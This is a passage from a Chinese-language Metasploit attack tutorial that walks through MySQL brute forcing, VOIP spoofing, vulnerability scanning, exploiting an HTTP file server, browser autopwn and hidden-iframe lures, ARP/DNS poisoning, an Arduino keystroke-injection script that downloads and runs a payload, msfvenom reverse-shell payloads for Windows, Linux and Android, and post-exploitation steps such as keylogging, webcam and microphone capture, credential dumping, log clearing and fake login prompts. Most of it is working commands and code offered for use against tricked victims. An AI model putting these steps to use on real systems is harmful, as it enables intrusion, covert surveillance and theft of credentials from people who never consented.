msf auxiliary(mysql_login)&gt; show options // 参数很多，可以看看
msf auxiliary(mysql_login)&gt; set RHOSTS 192.1.1.1
msf auxiliary(mysql_login)&gt; set USER_FILE /root/Desktop/user.txt // 用户名词典
msf auxiliary(mysql_login)&gt; set PASS_FILE /root/Desktop/pass.txt // 密码词典
msf auxiliary(mysql_login)&gt; run

// 同样的hashdump，同样的mysql_enum获取库详细信息。

// 直接访问对方SQL
root@kali:~# mysql -h 192.1.1.1 -u root -p
Enter password: ******
然后就进入了mysql
mysql&gt; show databases;
</code></pre>

<h2 id="voip渗透">VOIP渗透</h2>

<p>IP电话（Voice Over Internet Protocol, VOIP）比起传统的电话服务，价格会低廉的多，而且有更多的特性，例如来电提示，日志服务，通话录音等等。</p>

<p>所以很多公司都推出了用于IP电话服务的专用交换机（Private Branch eXchange, PBX），它可以便于公司内部各部门通信，而且也便于公司内部与外界连通（无需每个电话和外界单独连通了）。</p>

<p>VOIP本质上就是将Voice数字化，再以数据封包的方式在IP网络商做实时传递。注意：这个传输是以IP网络传输，而不是用电话网络传输。</p>

<p>VOIP中进行数据传输的协议类型包括: SIP（会话发起协议）, H.323, IAX2等等。</p>

<p>PBX就是一个程控交换机，计算机的数据VLAN 和 电话的声音VLAN一样都可以连接到它，并进行分发，然后它也可以负责和Internet网的连接或和公共电话网(Public Switched Telephone Network, PSTN)进行连接。</p>

<p>IP PBX就是将计算机网和电话交换机的功能合一。和传统PBX的区别是，传统PBX利用的电路交换原理来实现电话功能，而IP PBX则是使用TCP/IP协议，利用包交换原理，实现电话功能。</p>

<p>Asterisk是一款实现电话用户交换机（PBX）功能的开源软件，它支持VOIP的大部分协议，包括SIP。</p>

<h4 id="推荐网站">推荐网站</h4>

<p><a href="http://www.viproy.com">VOIP的渗透测试资料站</a></p>

<h4 id="voip扫描">VOIP扫描</h4>

<p>使用SIP端点扫描程序，扫描一个网段中的SIP服务信息，如下</p>

<pre><code>msf&gt; use auxiliary/scanner/sip/options
msf auxiliary(options)&gt; show options  // 建议查看参数
msf auxiliary(options)&gt; set RHOSTS 192.1.1.1/24  // 注意，这里不是单一IP。是IP段。 
msf auxiliary(options)&gt; run

// 这样就可以扫描256个IP（在IP段内），然后会获得其中拥有SIP服务的IP，以及其设备信息和支持的消息请求类型（其中的INVITE, ACK这些请求，类似GET,POST,HEAD这种），如下

[*] 192.1.1.12 sip:nobody@192.1.1.254 agent='hUQ'
[*] 192.1.1.13 404 agent='Asterisk PBX' verbs = 'INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY'
</code></pre>

<p>也可以扫描一个网段中的用户列表，如下</p>

<pre><code>msf&gt; use auxiliary/scanner/sip/enumerator
msf auxiliary(enumerator)&gt; show options  // 建议查看参数
msf auxiliary(enumerator)&gt; set RHOSTS 192.1.1.1/24
msf auxiliary(enumerator)&gt; set MINEXT 30000 // 分机号码起始值
msf auxiliary(enumerator)&gt; set MAXEXT 33000 // 分机号码结束值
msf auxiliary(enumerator)&gt; set PADLEN 5
msf auxiliary(enumerator)&gt; run

于是这将会在 192.1.1.1/24 这个子网段，扫描 30000-330000 分机号码的用户，如下

[*] Found user: 30008 &lt;sip:30008@192.1.1.254&gt; [open]
[*] Found user: 30023 &lt;sip:30023@192.1.1.254&gt; [open]
</code></pre>

<h4 id="voip电话欺骗">VOIP电话欺骗</h4>

<pre><code>msf&gt; use auxiliary/voip/sip_invite_spoof
msf auxiliary(sip_invite_spoof)&gt; show options  // 建议查看参数
msf auxiliary(sip_invite_spoof)&gt; set RHOSTS 192.1.1.254
msf auxiliary(sip_invite_spoof)&gt; set SRCADDR 192.1.1.1 // 伪造电话源地址
msf auxiliary(sip_invite_spoof)&gt; set EXTENSION 4444
msf auxiliary(sip_invite_spoof)&gt; run
</code></pre>

<p>这样就给 192.1.1.254 这个IP伪造了一个来电电话。</p>

<h4 id="voip渗透攻击">VOIP渗透攻击</h4>

<pre><code>msf&gt; use exploit/windows/sip/sipxphone_cseq
msf exploit(sipxphone_cseq)&gt; show options  // 建议查看参数
msf exploit(sipxphone_cseq)&gt; set RHOSTS 192.1.1.254
msf exploit(sipxphone_cseq)&gt; set PAYLOAD windows/meterpreter/bind_tcp
msf exploit(sipxphone_cseq)&gt; set LHOSTS 192.1.1.1
msf exploit(sipxphone_cseq)&gt; exploit
</code></pre>

<h2 id="渗透实例">渗透实例</h2>

<h4 id="前期准备">前期准备</h4>

<p>对于沟通，社工获取信息部分，这里不再细述。</p>

<p>我们直接从目标机的漏洞扫描开始。</p>

<h4 id="metasploit中使用openvas进行漏洞扫描">Metasploit中使用OpenVAS进行漏洞扫描</h4>

<pre><code>// 首先创建工作区，以便我们同时进行多个任务的切换
msf&gt; workspace -a NetScan
[*] Added workspace: NetScan

// 切换到该工作区下，开始工作。（以后只要输入 workspace NetScan 就能切换到该工作区）
msf&gt; workspace NetScan
[*] Workspace: NetScan

// 查看 msf 可加载插件
msf&gt; load
[*] load sqlmap
[*] load nessue
[*] load openvas
[*] load nexpose
...

// 加载 openvas 插件模块
msf&gt; load openvas

// 使用 openvas 插件 和 openvas软件本身进行连接
msf&gt; openvas_connect admin password localhost 9390 ok
[+] OpenVAS connection successful

// 要启动漏洞扫描，首先就是确定扫描目标
// 下面创建一个IP为192.1.1.1的目标，名字我们称为 targetA, 备注为 TestMachine
msf&gt; openvas_target_create targetA 192.1.1.1 TestMachine
msf&gt; openvas_target_list

创建成功，将会出现下列列表，我们要注意信息中最前面的ID

[+] OpenVAS list of targets
0   Localhost   127.0.0.1   Comment: nil 
1   targetA     192.1.1.1   Comment: TestMachine

// 接下来，需要为被测试的目标定义一个策略，我们先查看策略列表
msf&gt; openvas_config_list

[+] OpenVAS list of configs
0   Discovery
1   empty
2   Full and fast
3   Full and ver deep
...
7   System Discovery

// 我们开始创建漏洞扫描任务。
// 注意，参数里面的 2 是openvas_config_list中的[Full and fast]模式
// 参数里面的 1 是openvas_target_list中的[1]号，targetA的IP
msf&gt; openvas_task_create NetscanTask ScanForVulns 2 1

// 然后漏洞扫描任务就开始执行了，期间我们可以查看其进度
msf&gt; openvas_task_list
[+] OpenVAS list of tasks
0   NetscanTask     Running     Comment:ScanForVulns

// 当任务结束后，我们可以查看扫描报告列表
msf&gt; openvas_report_list
[+] OpenVAS list of reports
0   NetscanTask     2019-11-01T15:00:01Z    2019-11-01T15:32:21Z
1   OtherFinTask    2019-10-21T08:03:50Z    2019-10-22T01:43:05Z

// 然后我们选择将扫描报告以指定方式进行保存
// 首先我们先看保存的格式选项列表
msf&gt; openvas_format_list

[+] OpenVAS list of report formats
0       AnonymousXML xml
1       ARF xml
2       CPE csv
3       HTML html
...
11      TXT txt
12      VeriniceISM vna
13      XML xml

// 我们想保存为标准xml格式，所以如下操作
// 参数中的 0 是openvas_report_list中的[0]号报告
// 参数中的 13 是openvas_format_list中的[13]XML格式
msf&gt; openvas_report_import 0 13

// 这些漏洞报告被以XML格式保存到数据库中之后，我们可以通过浏览器查看，URL为
https://127.0.0.1:9392

// 即可获得目标机上的漏洞列表。
</code></pre>

<h4 id="metasploit中使用nessus进行漏洞扫描">Metasploit中使用Nessus进行漏洞扫描</h4>

<p>上面我们在Metasploit中使用OpenVAS进行了漏洞扫描，这里我们使用Nessus进行漏洞扫描，Nessus是收费的，但它比OpenVAS更强大，十分推荐。</p>

<p>要在Kali中安装Nessus，我们可以参考<a href="http://www.hackandtinker.net/213/1/16/how-to-install-setup-and-use-nessus-on-kali/">这篇文章</a></p>

<pre><code>// 下面开始连接nessus
msf&gt; load nessus
msf&gt; nessus_connect root:xxoo@127.0.0.1:8834
// 下面查看nessus策略列表
msf&gt; nessus_policy_list
[*] PolicyID:22 Name:BasicPolicy UUID:731a8e52-372e-98a1-ec0a-d2ff9083dba82ab2338d65
// 通过UUID创建一个扫描任务
msf&gt; nessus_scan_new 731a8e52-372e-98a1-ec0a-d2ff9083dba82ab2338d65 myScanTask &quot;new scan task comment&quot; 192.1.1.3
[*] ScanID:50 ScannerID:1 PolicyID:22 Targets:192.1.1.3 Owner:root
// 然后我们通过ScanID创建一个扫描任务并执行
msf&gt; nessus_scan_launch 50
// 然后进一步查看扫描的进行状态
msf&gt; nessus_scan_details 50 info
// 扫描完成后，我们查看扫描结果信息
msf&gt; nessus_report_hosts 50
[*] 192.1.1.3 Critical:10 High:4 Medium:17 Low:5
// 我们发现这个系统有10个高危漏洞，4个重点漏洞，17个中级漏洞，5个低级漏洞。
// 然后我们查看具体的漏洞列表
msf&gt; nessus_report_vulns 50
[*] 10028  DNS BIND remote detection
[*] 10245  SMTP server detection
[*] ...
// 我们也可以将这个结果导入到Metasploit数据库
msf&gt; nessus_db_import 50
// 不过，在导入之前，建议先创建一个新工作区，不然会覆盖之前OpenVAS的导入数据
</code></pre>

<p>在此之后，我们可以执行以下命令了解更多信息</p>

<pre><code>msf&gt; hosts  // 目标对象的基本信息
msf&gt; vulns  // 目标对象上漏洞信息
msf&gt; services // 目标对象上的服务信息
</code></pre>

<h4 id="威胁建模">威胁建模</h4>

<p>此时我们要根据漏洞列表，去分析漏洞的作用，找到当前最合适的漏洞。</p>

<p>例如DDOS宕机的漏洞可能意义不大，而能获取控制权限的漏洞可能意义非凡。</p>

<p>总之，这里我们选择一个CVE 2014-6287的HTTP文件服务器远程代码执行漏洞作为突破口。</p>

<pre><code>msf&gt; search cve:2014-6287

[+] exploit/windows/http/rejetto_hfs_exec 2014-09-11
</code></pre>

<p>我们得到了这个CVE的EXP。</p>

<h4 id="获取权限">获取权限</h4>

<pre><code>msf&gt; use exploit/windows/http/rejetto_hfs_exec
msf exploit(rejetto_hfs_exec)&gt; show payloads // 查看这个EXP对应的payloads
msf exploit(rejetto_hfs_exec)&gt; set RHOST 192.1.1.1
msf exploit(rejetto_hfs_exec)&gt; set RPORT 8080
msf exploit(rejetto_hfs_exec)&gt; set payload windows/meterpreter/reverse_tcp
msf exploit(rejetto_hfs_exec)&gt; set LHOST 192.1.1.2
msf exploit(rejetto_hfs_exec)&gt; exploit
// 成功，我们进一步使用arp查找该系统的临近计算机
meterpreter&gt; sysinfo
meterpreter&gt; arp
</code></pre>

<h4 id="使用faraday管理测试结果">使用Faraday管理测试结果</h4>

<p>Faraday是一个开源协作渗透和漏洞管理工具。它有大量的仪表面板以便进行漏洞的可视化。它和大量的渗透工具也能简单的无缝集成。</p>

<p>例如，我们把metasploit扫到的漏洞给faraday可视化：</p>

<pre><code>// 将数据导出到xml文件
msf&gt; db_export -f xml /root/desktop/abc.xml
// 然后将这个xml复制到faraday目录下就可以了
root@kali:&gt;$ cp /root/desktop/abc.xml /root/.faraday/report/pentest/
</code></pre>

<p>然后，在Faraday中就可以看到刚才漏洞的dashboard了。</p>

<p><a href="https://github.com/infobyte/faraday/wiki/Demos">Faraday的一些Demo</a></p>

<h4 id="手动写报告的格式">手动写报告的格式</h4>

<ul>
<li>封面/文档属性</li>
<li>目录</li>
<li>摘要

<ul>
<li>渗透测试适用范围</li>
<li>严重性信息</li>
<li>目标</li>
<li>假设</li>
<li>漏洞信息摘要：危险层级和数量</li>
<li>漏洞分布图：类型分布等</li>
<li>建议摘要</li>
</ul></li>
<li>方法/技术报告

<ul>
<li>测试细节</li>
<li>漏洞名单</li>
<li>可能性</li>
<li>建议</li>
</ul></li>
<li>参考文件</li>
<li>词汇表</li>
<li>附录</li>
</ul>

<h2 id="客户端渗透">客户端渗透</h2>

<p>客户端渗透的定义是：需要目标用户配合才能成功的渗透。</p>

<p>例如诱骗对方访问恶意网址，打开执行文件等，之后我们才能成功渗透到对方系统。</p>

<p>下面是一些常见的客户端渗透技术。</p>

<h4 id="基于浏览器的渗透攻击">基于浏览器的渗透攻击</h4>

<p><a href="https://www.cvedetails.com/top-50-products.php">一些漏洞列表</a></p>

<p>我们这里以Browser autopwn攻击为例。</p>

<p>它的渗透原理是：</p>

<ul>
<li><p>首先，我们本地建立一个渗透服务器，它进行监听。</p></li>

<li><p>然后，我们某种方式诱导受害者访问恶意链接，此时渗透服务器会检测用户浏览器类型并发送对应的渗透EXP模块。</p></li>

<li><p>自动在目标机器执行渗透模块，并提供meterpreter控制权限给攻击者。</p></li>
</ul>

<p>过程如下：</p>

<pre><code>// 选择autopwn，这里有两个autopwn，其中browser_autopwn2更新更强大，能扫描到的漏洞更多，但方便测试，这里选择了简单的browser_autopwn
msf&gt; search autopwn
[*] auxiliary/server/browser_autopwn
[*] auxiliary/server/browser_autopwn2
// 模块参数配置
msf &gt; use auxiliary/server/browser_autopwn
msf auxiliary(browser_autopwn) &gt; set LHOST 192.1.1.2
msf auxiliary(browser_autopwn) &gt; set URIPATH /
msf auxiliary(browser_autopwn) &gt; exploit
// 回车后会自动处理很多数据，要等几分钟
msf auxiliary(browser_autopwn) &gt; [*] Done in 1.927183322 seconds
[*] Using URL: http://0.0.0.0:8080/NWHAsWTPb
[*] Local IP: http://192.1.1.1:8080/NWHAsWTPb
[*] Server started.
[*] ....
[*] --- Done, found 21 exploit modules
[*] Server started.
// 然后我们用某种方式诱骗他人访问 http://192.1.1.1:8080/
// 当有人访问到【http://192.1.1.1:8080/】这个URL时，渗透服务器就会持续发送各种EXP，最终拿到Meterpreter控制权限为止。
[*] Session ID 1 (192.1.1.1:7777 -&gt; 192.1.1.2:49716) processing InitialAutoRunScript 'migrate -f'
[*] Successfully migrated to process
// 查看当前“上当”的受害机器会话列表
msf auxiliary(browser_autopwn) &gt; sessions -i
[*] Active sessions
===============
  Id  Type                   Information  Connection
  --  ----                   -----------  ----------
  1   meterpreter java/java  tt @ liuxin  192.1.1.1:7777 -&gt; 192.1.1.2:49716 (192.1.1.2)
  2   meterpreter java/java  tt @ liuxin  192.1.1.1:7777 -&gt; 192.1.1.2:49717 (192.1.1.2)
// 选择一个会话
msf auxiliary(browser_autopwn) &gt; sessions -i 1
[*] Starting interaction with 1...
// 查看对方主机信息
meterpreter &gt; sysinfo
</code></pre>

<h4 id="恶意链接的传播方式">恶意链接的传播方式</h4>

<ol>
<li><p>直接发送渗透服务器IP肯定是不行的，于是最基本的，可以用域名欺骗受害者点击。</p></li>

<li><p>可以拿到一些有漏洞的网站管理权，在其网站嵌入隐藏iFrame，那么别人在访问这个网站时，就会被渗透。</p></li>
</ol>

<pre><code>// 例如在受害者网站的index.php里加入
&lt;iframe src=&quot;http://192.1.1.1:80/&quot; width=0 height=0 style=&quot;hidden&quot;
frameborder=0 marginheight=0 marginwidth=0 scrolling=no&gt;&lt;/iframe&gt;
</code></pre>

<ol>
<li>如果是局域网的话，还可以使用ARP投毒+DNS欺骗。用户在访问网站时，通过DNS解析得到错误IP，就会被渗透。</li>
</ol>

<pre><code>// 首先，我们要进行DNS投毒。我们先创建一个伪造dns文件如下
root@kali:~# vi /usr/share/ettercap/etter.dns
// 里面内容填写为
google.com A 192.1.1.1
baidu.com A 192.1.1.1
// 然后我们开启ettercap软件
root@kali:~# ettercap -G

// 然后选择sniff-&gt; Unifed sniffing.. -&gt; 通常选择eth0网卡作为默认端口
// 选择hosts-&gt;scan for hosts 扫描目标网络范围内的在线主机IP地址
// 扫描完成后 hosts-&gt;host list查看在线主机列表
// 然后我们开始ARP定向投毒
// 设置网关地址为 target2, 设置受害者地址为  target1, 进行start sniffing
// 这是ARP中间人攻击。
// 之后受害者就会以为我们是网关，所有网络消息将发送给我们，我们再自动将其消息转发给真正的网关。
// 而网关又会认为我们是受害机，所有的返回消息也都会给我们。
// 一切消息经过我们转发，我们就可以查看受害者访问状况。
// 例如 urlsnarf -i eth0 获取受害人访问了哪些网页
// 例如 driftnet -i eth0 获取受害人看的网络视频和网络图片之类的
// 利用 sslstrip -a -f -k  获取受害人的账号密码之类的
// 当然这次我们仅仅关注的是受害者的DNS解析消息。
// 于是我们在 ettercap 的plugins选项中点击Manager the plugins-&gt;DNS Spoof plug-in激活DNS欺骗。
// 欺骗的信息我们一已经在 etter.dns 里伪造好了。于是只要受害者访问 google.com 就会进入192.1.1.1 被我们渗透了。
</code></pre>

<h2 id="利用arduino单片机进行渗透">利用Arduino单片机进行渗透</h2>

<p>Arduino是一个很小的（USB盘大小）的单片机，价格很便宜20来块RMB就够。</p>

<p>部分Arduino板支持键盘鼠标库，意味着它们可以成为HID设备，例如点键盘，移动，点鼠标等动作。</p>

<p>但是Arduino没有存储空间，所以，我们将代码烧录到单片机上之后，需要从网上下载 payload。</p>

<p><a href="https://www.arduino.cc/en/Guide/Windows">Arduino基本设置说明</a></p>

<p>下面是一个简单的Arduino渗透工具代码。</p>

<pre><code>    #include&lt;Keyboard.h&gt;
    // Arduino默认执行初始函数
    void setup() {
        delay(2000); // Arduino默认等待函数
        // 按下【Windows+d】键，显示桌面的快捷键
        myKeypress(KEY_LEFT_GUI,false);
        myKeypress('d',false);
        Keyboard.releaseAll();
        delay(500);
        // 按下【windows+r】键，启动【运行】的快捷键
        myKeypress(KEY_LEFT_GUI,false);
        myKeypress('r',false);
        delay(500);
        Keyboard.releaseAll();
        delay(1000);
        // 输入powershell命令，下载payload并将其存储到temp中
        print(F(&quot;powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://192.1.1.1/myTestPayload.exe','%TEMP%\\myPayload.exe'); Start-Process &quot;%TEMP%\\myPayload.exe&quot;&quot;));
        delay(1000);
        // 按下回车键，执行上述powershell
        myKeypress(KEY_RETURN,false);
        Keyboard.releaseAll();
        Keyboard.end();
    }
    // 按键函数
    void myKeypress(int key, boolean release) {
        Keyboard.press(key);
        if(release)
            Keyboard.release(key);
    }
    void print(const __FlashStringHelper *value) {
        Keyboard.print(value);
    }
    // Arduino默认核心函数
    void loop(){}
</code></pre>

<p>然后将上面的代码烧录到Arduino单片机上。</p>

<p>之后只要将这个单片机用USB接口插到目标机上几秒就OK了，自动下载自动执行payload。我们就可以远程meterpreter了。</p>

<p>上述过程中的payload如下开发：</p>

<pre><code>root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.1.1.1 LPORT=5555 -f exe &gt; /var/www/html/myTestPayload.exe

我们就得到了一个exe格式的payload，大小一般只有几百字节。
</code></pre>

<p>然后我们开个Apache把它挂到网上去，等待Arduino单片机控制受害机下载运行</p>

<pre><code>root@kali:~# service apache2 start
</code></pre>

<p>然后我们再开一个渗透服务器，等待受害机的payload连接</p>

<pre><code>msf&gt; use exploit/multi/handler
msf exploit(handler)&gt; set payload windows/x64/meterpreter/reverse_tcp
msf exploit(handler)&gt; set LPORT 5555
msf exploit(handler)&gt; set LHOST 192.1.1.1
msf exploit(handler)&gt; exploit
[*]starting reverse TCP handler on 192.1.1.1:5555

// 这就在监听了，然后，如果有人受害，payload发作后，我们的渗透服务器就会显示

[*] Meterpreter session 1 opened(192.1.1.1:5555 -&gt; 192.1.1.2:12668)
Meterpreter&gt; sysinfo
...

// 我们就渗透完成了
</code></pre>

<h2 id="利用pdf文件进行渗透">利用PDF文件进行渗透</h2>

<p>首先，生成一个pdf格式的payload</p>

<pre><code>msf&gt; use exploit/windows/fileformat/adobe_cooltype_sing
msf exploit(adobe_cooltype_sing)&gt; set payload windows/meterpreter/reverse_tcp
msf exploit(adobe_cooltype_sing)&gt; set LHOST 192.1.1.1
msf exploit(adobe_cooltype_sing)&gt; exploit
[*] Generated output file /root/.msf4/data/exploits/msf.pdf
msf exploit(adobe_cooltype_sing)&gt; back // 返回msf命令
msf&gt;
</code></pre>

<p>然后创建一个handler等待受害机连接就好（命令上面有，不重复了）</p>

<p>对方点了pdf就渗透连接了。</p>

<p>【！！！】这里有个要点，一旦meterpreter渗透成功，渗透服务器这边应该马上将这个meterpreter migrate到另外一个进程去，因为，一旦Adobe pdf reader进程被用户关闭，当前这个meterpreter shell就会被销毁了。</p>

<h2 id="利用word文件进行渗透">利用WORD文件进行渗透</h2>

<p>和上面一样，不细说了</p>

<pre><code>msf&gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
</code></pre>

<h2 id="渗透linux系统">渗透Linux系统</h2>

<p>这和用exe文件渗透 windows 系统一样，使用elf文件渗透linux系统即可。</p>

<pre><code>// 使用msfvenom创建windows的EXE文件
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=129.0.0.1 LPORT=801 -f exe -o /Users/xxxx/downloads/xxoo.exe

// 使用msfvenom创建linux的elf文件
root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=129.0.0.1 LPORT=801 -f elf -o /var/xxxx/downloads/xxoo.elf
</code></pre>

<p>然后把这个elf文件复制到apache的public目录，想办法让目标机器访问这个文件并执行即可。</p>

<pre><code>root@otherPC:~# wget http://192.1.1.1/xxoo.elf
root@otherPC:~# chmod 777 xxoo.elf
root@otherPC:~# ./xxoo.elf
</code></pre>

<p>这就触发了handler，它会主动连接我们的服务器，我们也就获得了目标程序的meterpreter权限</p>

<pre><code>msf&gt; use exploit/mutil/handler
msf exploit(handler)&gt; set payload linux/x86/meterpreter/reverse_tcp
msf exploit(handler)&gt; set LPORT 801
msf exploit(handler)&gt; set LHOST 129.0.0.1
msf explosit(handler)&gt; exploit // 执行攻击
Meterpreter&gt;  // 此时我们已经取得了目标系统的Meterpreter权限。然后自由发挥了，例如
Meterpreter&gt; sysinfo // 查看目标机系统信息
</code></pre>

<h2 id="渗透android系统">渗透Android系统</h2>

<p>基本和上面一样，创建一个android的apk文件</p>

<pre><code>// 使用msfvenom创建android的apk文件
root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=129.0.0.1 LPORT=801 R&gt; /var/xxxx/downloads/xxoo.apk
</code></pre>

<p>接下来一样，欺骗受害者去安装该软件，然后</p>

<pre><code>msf&gt; use exploit/mutil/handler
msf exploit(handler)&gt; set payload android/meterpreter/reverse_tcp
msf exploit(handler)&gt; set LPORT 801
msf exploit(handler)&gt; set LHOST 129.0.0.1
msf explosit(handler)&gt; exploit // 执行攻击
Meterpreter&gt;  // 此时我们已经取得了目标系统的Meterpreter权限。然后自由发挥了，例如
Meterpreter&gt; check_root // 查看目标机是否已经root
Meterpreter&gt; send_sms -d 168xxx000xxx -t &quot;hello&quot; // 给指定号码发送短信
Meterpreter&gt; wlan_geolocate // 获取该手机卫星定位位置
Meterpreter&gt; webcam_snap // 使用被渗透手机进行拍照
</code></pre>

<h2 id="基本后渗透命令">基本后渗透命令</h2>

<p>我们前面主要记录的是如何进行EXP渗透，渗透成功后的功能虽有说明，却不多，接下来从最基本的命令记录后渗透命令。</p>

<pre><code>// 帮助命令
meterpreter&gt; ?
// 转到后台命令（转到后台后，我们就可以执行其他的任务）
meterpreter&gt; background
[*] Backgrounding session 1111...
// 记住上面的session，我们可以将其呼出到前台
meterpreter&gt; sessions -i 1111
// 如果记不住session ID，可以如下获取当前的所有session列表
meterpreter&gt; sessions -i
// 获取机器的ID和UUID
meterpreter&gt; machine_id
meterpreter&gt; uuid
// 获取通信通道（列出全部通信通道）
meterpreter&gt; channel -l
// 使用指定通信通道
meterpreter&gt; channel -r 1111
// 获取当前用户名和挂接的进程名
meterpreter&gt; getuid
meterpreter&gt; getpid
// 获取PID后，再通过PS去获取当前进程信息
meterpreter&gt; ps
// 获取系统信息
meterpreter&gt; sysinfo
// 获取网络信息
meterpreter&gt; ipconfig 或 ifconfig
meterpreter&gt; arp        // 查看受害机相连接的IP，可以查看局域网IP信息
meterpreter&gt; netstat    // 查看当前用过的端口
// 查看当前工作目录
meterpreter&gt; pwd
// 从本地向受害机传输文件
meterpreter&gt; upload /local/1.txt C:\
// 修改查看受害机文件
meterpreter&gt; edit c:\\1.txt
meterpreter&gt; cat c:\\1.txt
// 枚举所有可用桌面以及桌面信息
meterpreter&gt; enumdesktops
meterpreter&gt; getdesktop
// 截屏
meterpreter&gt; screenshot
meterpreter&gt; webcam_snap
// 查看摄像头并录制视频
meterpreter&gt; webcam_list
meterpreter&gt; webcam_stream
// 监听麦克风
meterpreter&gt; record_mic -d 1111 // 后面参数是录制的秒数
// 监听键盘
meterpreter&gt; keyscan_start // 开始录制键盘信息
meterpreter&gt; keyscan_dump // 输出刚才按下的键盘信息
// 计算用户闲置时间（用来推测用户不怎么使用计算机的时间）
meterpreter&gt; idletime
</code></pre>

<h2 id="高级后渗透命令">高级后渗透命令</h2>

<h4 id="安全迁移">安全迁移</h4>

<p>一般来说，meterpreter会话是从一个临时文件payload进去的。只要这个临时进程被关闭，meterpreter将会被踢出。所以我们最好将meterpreter迁移到更安全的进程上，例如svchost.exe, explorer.exe之类。</p>

<pre><code>// 首先PS查看进程PID
meterpreter&gt; ps
[*] 1866 explorer.exe x64 2 User c:\windows\explorer.exe
// 然后进行迁移
meterpreter&gt; migrate 1866
meterpreter&gt; getpid
// 就会发现当前meterpreter所在PID已经转移。
</code></pre>

<h4 id="获取系统管理员权限">获取系统管理员权限</h4>

<p>如果被渗透的应用程序是用管理员权限运行的，那么getsystem即可。</p>

<pre><code>meterpreter&gt; getsystem
</code></pre>

<p>获取了管理员权限后，可以简单的hashdump去获取被害机的登录用户密码hash值</p>

<pre><code>meterpreter&gt; run hashdump
</code></pre>

<p>获取密码hash值之后，我们可以对目标发起pass-the-hash攻击。</p>

<p>部分情况下，我们并没有最高权限，此时就需要进一步渗透提权。</p>

<pre><code>// 该漏洞是针对 windows server 2008 sp1的
msf&gt; use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d)&gt; show options
msf exploit(ms10_015_kitrap0d)&gt; set session 1111    // 使用刚才的meterpreter
msf exploit(ms10_015_kitrap0d)&gt; exploit
meterpreter&gt; getuid // 检查自己的账号
</code></pre>

<h4 id="修改文件时间">修改文件时间</h4>

<p>为了隐藏自身，我们可能需要修改文件的创建时间，修改时间，访问时间。</p>

<pre><code>meterpreter&gt; timestomp -v 1.txt
meterpreter&gt; timestomp -z &quot;11/26/2019 15:12:54&quot; 1.txt
</code></pre>

<h4 id="清除系统记录">清除系统记录</h4>

<p>这个命令可以清除windows系统下的 Application, System, Security日志。</p>

<pre><code>meterpreter&gt; clearev 
</code></pre>

<p>查看目标机环境的事件日志</p>

<pre><code>meterpreter&gt; run event_manager -i
</code></pre>

<h2 id="其他后渗透模块">其他后渗透模块</h2>

<h4 id="获取受害机附近的无线ssid信息">获取受害机附近的无线SSID信息</h4>

<pre><code>meterpreter&gt; run post/windows/wlan/wlan_bss_list
</code></pre>

<h4 id="收集受害机记录的无线密码">收集受害机记录的无线密码</h4>

<pre><code>meterpreter&gt; run post/windows/wlan/wlan_profile
</code></pre>

<p>在收集的数据中， <name>标签中是网络名， <keyMeterial>记录的则是登录密码</p>

<h4 id="收集受害机上软件列表">收集受害机上软件列表</h4>

<pre><code>meterpreter&gt; run get_application_list
</code></pre>

<h4 id="获取skype密码">获取skype密码</h4>

<pre><code>meterpreter&gt; run post/windows/gather/credentials/skype
</code></pre>

<h4 id="获取usb使用记录">获取USB使用记录</h4>

<pre><code>meterpreter&gt; run post/windows/gether/usb_history
</code></pre>

<h4 id="目标机上文件查找">目标机上文件查找</h4>

<pre><code>meterpreter&gt; search -f *.avi
</code></pre>

<h4 id="使用-mimikatz-查找明文密码">使用 mimikatz 查找明文密码</h4>

<pre><code>// 加载minikatz插件
meterpreter&gt; load mimikatz
// 使用下面的命令获取windows中活跃的账号和明文密码
meterpreter&gt; kerberos
</code></pre>

<h4 id="进行流量探嗅">进行流量探嗅</h4>

<pre><code>// 探嗅当前的网络接口，得到网络接口设备列表
meterpreter&gt; sniffer_interfaces
[*] 1 - VMWare Virtual Ethernet Adapter for WMNet8
[*] 2 - Realtek RTL8723BE Wireless LAN 802.11n PCI-E NIC
....
// 指定接口进行探嗅(探嗅端口为2号，探嗅数据缓冲为1000)
meterpreter&gt; sniffer_start 2 1000
// 将探嗅的数据输出出来
meterpreter&gt; sniffer_dump 2 test.pcap
// 最后将探嗅的数据用wireshark查看即可
meterpreter&gt; wireshard test.pcap
</code></pre>

<h4 id="修改目标机host文件">修改目标机Host文件</h4>

<pre><code>msf&gt; use post/windows/manager/inject_host
msf post(inject_host)&gt; show options
msf post(inject_host)&gt; show DOMAIN www.baidu.com
msf post(inject_host)&gt; set IP 192.1.1.1
msf post(inject_host)&gt; set SESSION 1
msf post(inject_host)&gt; exploit
</code></pre>

<p>目标机再访问baidu.com即可进入我们的恶意服务器（可以是个钓鱼站）</p>

<h4 id="弹出钓鱼面板">弹出钓鱼面板</h4>

<pre><code>meterpreter&gt; run post/windows/gether/phish_login_pass
// 此时在受害机会弹出一个类似windows登录界面的一个弹出框
// 等用户中计，输入“账号密码”后执行下命令将得到账户密码
meterpreter&gt; run post/windows/gether/phish_windows_credentials
[*] userWinName hisPassword
</code></pre>

<h2 id="其他便利渗透的技巧">其他便利渗透的技巧</h2>

<h4 id="图形化工具armitage">图形化工具Armitage</h4>

<p>Armitage是Metasploit的界面化工具，它用java创建，可以跨平台。</p>

<p>它本身支持一种叫 Cortana 的脚本语言，它记录脚本的每一个操作，可以保存为 .cna 后缀格式。</p>

<p><a href="http://www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf">Cortana语言说明</a></p>

<h4 id="重加载以便开发测试">重加载以便开发测试</h4>

<p>我们在开发exp模块时，可能需要对payload等不停的修改。每次修改后，都需要metasploit重新更新，此时推荐命令为</p>

<pre><code>// 修改文件
msf exploit(my_test)&gt; edit
// 这样会启动VIM进行文件编辑
...
// 修改完成，通知reload
msf exploit(my_test)&gt; reload
</code></pre>

<p>这样就不用重新启动metasploit了。</p>

<h4 id="常用操作的脚本化">常用操作的脚本化</h4>

<p>例如我们经常进行如下操作：</p>

<pre><code>msf&gt; use exploit/mutil/handler
msf exploit(handler)&gt; set payload android/meterpreter/reverse_tcp
msf exploit(handler)&gt; set LPORT 801
msf exploit(handler)&gt; set LHOST 129.0.0.1
